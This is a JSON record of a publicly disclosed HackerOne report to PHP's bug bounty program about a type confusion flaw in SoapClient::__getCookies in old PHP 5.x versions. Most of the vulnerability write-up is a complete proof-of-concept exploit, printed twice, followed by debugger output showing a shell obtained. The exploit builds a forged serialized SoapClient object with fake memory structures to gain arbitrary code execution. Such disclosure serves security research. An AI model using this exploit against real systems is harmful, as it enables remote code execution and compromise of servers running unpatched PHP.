{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73245, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-04-16T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Type Confusion Vulnerability in SoapClient", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:41:09.905Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:41:09.905Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "ryat", 
                "url": "/ryat"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496255, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-07-01T07:43:06.119Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-07-01T07:43:06.119Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "Type Confusion Vulnerability in SoapClient", 
                "old_title": "Type Confusion Infoleak Vulnerability in unserialize() with SoapFault"
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 497215, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ryat", 
                "url": "/ryat"
            }, 
            "created_at": "2015-07-01T07:43:06.119Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:45.867Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196221, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "ryat", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ryat", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-04-16T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73245", 
    "created_at": "2015-03-01T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"type-confusion-vulnerability-in-soapclient\">Type Confusion Vulnerability in SoapClient</h1>\n\n<p>Taoguang Chen &lt;<a href=\"/redirect?signature=356e5b8acd0c1b3ee4eb0bfb9d4a142217e2d0de&amp;url=http%3A%2F%2Fgithub.com%2Fchtg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span> () chtg</span><i class=\"icon-external-link\"></i></a>&gt; - Write Date: 2015.3.1</p>\n\n<ul>\n<li>Release Date: 2015.3.20</li>\n</ul>\n\n<p>A type confusion vulnerability was discovered in SoapClient object&#39;s __getCookies() method that can be abused for <br>\nleaking arbitrary memory blocks or execute arbitrary code remotely.</p>\n\n<h2 id=\"affected-versions\">Affected Versions</h2>\n\n<p>Affected is PHP 5.6 &lt; 5.6.7<br>\nAffected is PHP 5.5 &lt; 5.5.23<br>\nAffected is PHP 5.4 &lt; 5.4.39<br>\nAffected is PHP 5.3 &lt;= 5.3.29</p>\n\n<h2 id=\"credits\">Credits</h2>\n\n<p>This vulnerability was disclosed by Taoguang Chen.</p>\n\n<h2 id=\"description\">Description</h2>\n<pre class=\"highlight plaintext\"><code>PHP_METHOD(SoapClient, __getCookies)\n{\n        zval **cookies, *tmp;\n\n        if (zend_parse_parameters_none() == FAILURE) {\n                return;\n        }\n\n        array_init(return_value);\n\n        if (zend_hash_find(Z_OBJPROP_P(this_ptr), &quot;_cookies&quot;,\nsizeof(&quot;_cookies&quot;), (void **)&amp;cookies) != FAILURE) {\n                zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies),\n(copy_ctor_func_t) zval_add_ref, (void *)&amp;tmp, sizeof(zval*));\n        }\n}\n</code></pre>\n<p>The Z_ARRVAL_P macro leads to pointing a fake array-type ZVAL in<br>\nmemory via a fake HashTable and a fake Bucket. This should result in<br>\narbitrary code execution.</p>\n\n<h2 id=\"proof-of-concept-exploit\">Proof of Concept Exploit</h2>\n\n<p>The PoC works on standard MacOSX 10.10.3 installation of PHP 5.5.14.</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n\nini_set(&quot;memory_limit&quot;, -1);\n\nif ($_SERVER[&#39;argc&#39;] &lt; 2) {\n        $_SERVER[&#39;argv&#39;][1] = &#39;system(sh);exit;&#39;;\n}\n\nsetup_memory();\n\n$exploit = &#39;O:10:&quot;SoapClient&quot;:1:{s:8:&quot;_cookies&quot;;s:&#39;.strlen($hashtable).&#39;:&quot;&#39;.$hashtable.&#39;&quot;;}&#39;;\n$z = unserialize($exploit);\n// $z = new SoapClient(null, array(&#39;location&#39; =&gt; &quot;&quot;, &#39;uri&#39; =&gt; &quot;&quot;));\n// $z-&gt;_cookies = $hashtable;\n$z-&gt;__getCookies();\n\nfunction setup_memory()\n{\n        global $str, $hashtable;\n\n        $base = 0x114000020;\n        $bucket_addr = $base;\n        $zval_delta = 0x100;\n        $hashtable_delta = 0x200;\n        $zval_addr = $base + $zval_delta;\n        $hashtable_addr = $base + $hashtable_delta;\n        $func_addr = 0x100351e3d; // zend_eval_string()&#39;s address\n\n        $bucket  = &quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;\n        $bucket .= &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;\n        $bucket .= ptr2str($bucket_addr + 3*8);\n        $bucket .= ptr2str($zval_addr);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n\n        $hashtable  = &quot;\\x00\\x00\\x00\\x00&quot;;\n        $hashtable .= &quot;\\x00\\x00\\x00\\x00&quot;;\n        $hashtable .= &quot;\\x01\\x00\\x00\\x00&quot;;\n        $hashtable .= &quot;\\x00\\x00\\x00\\x00&quot;;\n        $hashtable .= &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str($bucket_addr);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= &quot;\\x00&quot;;\n        $hashtable .= &quot;\\x00&quot;;\n\n        $zval = ptr2str($hashtable_addr);\n        $zval .= ptr2str(0);\n        $zval .= &quot;\\x00\\x00\\x00\\x00&quot;;\n        $zval .= &quot;\\x04&quot;;\n        $zval .= &quot;\\x00&quot;;\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n\n        $shellcode = ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($hashtable_addr + 6*8);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($func_addr);\n        $shellcode .= ptr2str($hashtable_addr + 9*8);\n        $shellcode .= \n&quot;\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\\x5b\\x27\\x61\\x72\\x67\\x76\\x27\\x5d\\x5b\\x31\\x5d\\x29\\x3b\\x00&quot;;\n// eval($_SERVER[&#39;argv&#39;][1]);\n\n        $part = str_repeat(&quot;\\x73&quot;, 4096);\n        for ($j=0; $j&lt;strlen($bucket); $j++) {\n                $part[$j] = $bucket[$j];\n        }\n        for ($j=0; $j&lt;strlen($shellcode); $j++) {\n                $part[$j+$hashtable_delta] = $shellcode[$j];\n        }\n        for ($j=0; $j&lt;strlen($zval); $j++) {\n                $part[$j+$zval_delta] = $zval[$j];\n        }\n\n        $str = str_repeat($part, 1024*1024*256/4096);\n}\n\nfunction ptr2str($ptr)\n{\n        $out = &quot;&quot;;\n        for ($i=0; $i&lt;8; $i++) {\n                $out .= chr($ptr &amp; 0xff);\n                $ptr &gt;&gt;= 8;\n        }\n        return $out;\n}\n\n?&gt;\n</code></pre>\n<p>Test the PoC on the command line, then any PHP code can be executed:</p>\n<pre class=\"highlight plaintext\"><code>$ lldb php\n(lldb) target create &quot;php&quot;\nCurrent executable set to &#39;php&#39; (x86_64).\n(lldb) run tcpoc.php &#39;system\\(sh\\)\\;exit\\;&#39;\nProcess 2606 launched: &#39;/usr/bin/php&#39; (x86_64)\nsh: no job control in this shell\nsh-3.2$ php -v\nPHP 5.5.14 (cli) (built: Jan  8 2015 22:33:37)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\nsh-3.2$ exit\nexit\nProcess 2606 exited with status = 0 (0x00000000)\n(lldb)\n</code></pre>", 
    "vulnerability_information": "# Type Confusion Vulnerability in SoapClient\n\nTaoguang Chen <[ () chtg](http://github.com/chtg)> - Write Date: 2015.3.1\n- Release Date: 2015.3.20\n\nA type confusion vulnerability was discovered in SoapClient object's __getCookies() method that can be abused for \nleaking arbitrary memory blocks or execute arbitrary code remotely.\n\nAffected Versions\n------------\nAffected is PHP 5.6 < 5.6.7\nAffected is PHP 5.5 < 5.5.23\nAffected is PHP 5.4 < 5.4.39\nAffected is PHP 5.3 <= 5.3.29\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\n```\nPHP_METHOD(SoapClient, __getCookies)\n{\n        zval **cookies, *tmp;\n\n        if (zend_parse_parameters_none() == FAILURE) {\n                return;\n        }\n\n        array_init(return_value);\n\n        if (zend_hash_find(Z_OBJPROP_P(this_ptr), \"_cookies\",\nsizeof(\"_cookies\"), (void **)&cookies) != FAILURE) {\n                zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies),\n(copy_ctor_func_t) zval_add_ref, (void *)&tmp, sizeof(zval*));\n        }\n}\n```\n\nThe Z_ARRVAL_P macro leads to pointing a fake array-type ZVAL in\nmemory via a fake HashTable and a fake Bucket. This should result in\narbitrary code execution.\n\nProof of Concept Exploit\n------------\nThe PoC works on standard MacOSX 10.10.3 installation of PHP 5.5.14.\n\n```\n<?php\n\nini_set(\"memory_limit\", -1);\n\nif ($_SERVER['argc'] < 2) {\n        $_SERVER['argv'][1] = 'system(sh);exit;';\n}\n\nsetup_memory();\n\n$exploit = 'O:10:\"SoapClient\":1:{s:8:\"_cookies\";s:'.strlen($hashtable).':\"'.$hashtable.'\";}';\n$z = unserialize($exploit);\n// $z = new SoapClient(null, array('location' => \"\", 'uri' => \"\"));\n// $z->_cookies = $hashtable;\n$z->__getCookies();\n\nfunction setup_memory()\n{\n        global $str, $hashtable;\n        \n        $base = 0x114000020;\n        $bucket_addr = $base;\n        $zval_delta = 0x100;\n        $hashtable_delta = 0x200;\n        $zval_addr = $base + $zval_delta;\n        $hashtable_addr = $base + $hashtable_delta;\n        $func_addr = 0x100351e3d; // zend_eval_string()'s address\n        \n        $bucket  = \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $bucket .= \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $bucket .= ptr2str($bucket_addr + 3*8);\n        $bucket .= ptr2str($zval_addr);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        \n        $hashtable  = \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x01\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str($bucket_addr);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= \"\\x00\";\n        $hashtable .= \"\\x00\";\n        \n        $zval = ptr2str($hashtable_addr);\n        $zval .= ptr2str(0);\n        $zval .= \"\\x00\\x00\\x00\\x00\";\n        $zval .= \"\\x04\";\n        $zval .= \"\\x00\";\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n\n        $shellcode = ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($hashtable_addr + 6*8);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($func_addr);\n        $shellcode .= ptr2str($hashtable_addr + 9*8);\n        $shellcode .= \n\"\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\\x5b\\x27\\x61\\x72\\x67\\x76\\x27\\x5d\\x5b\\x31\\x5d\\x29\\x3b\\x00\";\n// eval($_SERVER['argv'][1]);\n        \n        $part = str_repeat(\"\\x73\", 4096);\n        for ($j=0; $j<strlen($bucket); $j++) {\n                $part[$j] = $bucket[$j];\n        }\n        for ($j=0; $j<strlen($shellcode); $j++) {\n                $part[$j+$hashtable_delta] = $shellcode[$j];\n        }\n        for ($j=0; $j<strlen($zval); $j++) {\n                $part[$j+$zval_delta] = $zval[$j];\n        }\n        \n        $str = str_repeat($part, 1024*1024*256/4096);\n}\n\nfunction ptr2str($ptr)\n{\n        $out = \"\";\n        for ($i=0; $i<8; $i++) {\n                $out .= chr($ptr & 0xff);\n                $ptr >>= 8;\n        }\n        return $out;\n}\n\n?>\n```\n\nTest the PoC on the command line, then any PHP code can be executed:\n\n```\n$ lldb php\n(lldb) target create \"php\"\nCurrent executable set to 'php' (x86_64).\n(lldb) run tcpoc.php 'system\\(sh\\)\\;exit\\;'\nProcess 2606 launched: '/usr/bin/php' (x86_64)\nsh: no job control in this shell\nsh-3.2$ php -v\nPHP 5.5.14 (cli) (built: Jan  8 2015 22:33:37)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\nsh-3.2$ exit\nexit\nProcess 2606 exited with status = 0 (0x00000000)\n(lldb)\n```", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}